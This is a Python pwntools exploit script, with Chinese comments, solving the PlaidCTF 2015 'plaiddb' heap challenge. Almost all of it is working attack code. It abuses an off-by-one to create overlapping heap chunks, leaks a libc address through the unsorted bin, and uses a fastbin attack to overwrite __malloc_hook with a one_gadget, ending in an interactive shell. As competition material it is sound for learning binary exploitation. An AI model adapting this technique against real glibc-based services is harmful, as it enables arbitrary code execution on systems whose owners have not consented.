#plaidctf 2015 plaiddb
from pwn import*
p=process('./pwn.elf')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')

def DEBUG(cmd=""):
    gdb.attach(p,cmd)
    pause()

def PUT(key,size,data):
    p.sendlineafter(b'command:',b'PUT')
    p.sendlineafter(b'row key:',key)
    p.sendlineafter(b'data size:',str(size))
    if len(data)<size:
        data=data.ljust(size,b'\x00')
    p.sendlineafter(b'data:',data)

def DEL(key):
    p.sendlineafter(b'command:',b'DEL')
    p.sendlineafter(b'row key:',key)
    
def GET(key):
    p.sendlineafter(b'command:',b'GET')
    p.sendlineafter(b'row key:',key)

for i in range(0,10):
    PUT(str(i),0x38,str(i).encode())
for i in range(0,10):
    DEL(str(i))
#由于程序中有多个零碎的malloc操作，为了防止这样的操作影响对chunk的布局， 
# 先进行一些填充操作，使malloc时分配的是已经free掉的而不是在堆上重新分配
# 保证后续的chunk能够按照预期的方式分布在堆上

PUT(b'A',0x200,b'A')
PUT(b'B',0x50,b'B')
PUT(b'C',0x68,b'C')
PUT(b'D',0x1f8,b'D')
PUT(b'E',0xf0,b'E')
PUT(b'F',0x20,b'F')

DEL(b'D')
DEL(b'A')
DEL(b'C')

payload=b'a'*0x1f0+p64(0x4e0)
DEL(payload)
DEL(b'E')
#通过off by one漏洞，修改chunk的pre size和size字段的值，
# 使其变大并且pre in use位清零，从而在后续的free操作中将相邻的chunk合并到一起，

PUT(b'0x200 fillup', 0x200, b'fillup again')
GET(b'B')
# DEBUG()
p.recvuntil(b']:\n')
fd=u64(p.recv(16)[:6].ljust(8,b'\x00'))
print(hex(fd))
libc_base=fd-0x3BE7b8
malloc_hook=libc_base+libc.symbols['__malloc_hook']
one=libc_base+0x4652c
#利用unsorted bin来泄露libc地址

DEBUG()
payload1=b'a'*0x58+p64(0x71)+p64(malloc_hook-0x20-3)
print(f"mallochook:{hex(malloc_hook)}")
print(hex(malloc_hook-0x20-3))
PUT(b'attack',0x90,payload1)
pause()
PUT(b'pre',0x68,p64(malloc_hook-0x20-3))
payload2=b'a'*19+p64(one)
# DEBUG()
PUT(b'att',0x68,payload2)
#fastbin攻击，利用malloc_hook的地址修改前一个fastbin的fd指针，从而构造一个伪chunk，
# 放在fastbin链表中，当下次malloc时就会返回这个伪chunk的地址，
# 覆盖malloc_hook的值为one gadget的地址，
p.sendline('DEL')


p.interactive()

    
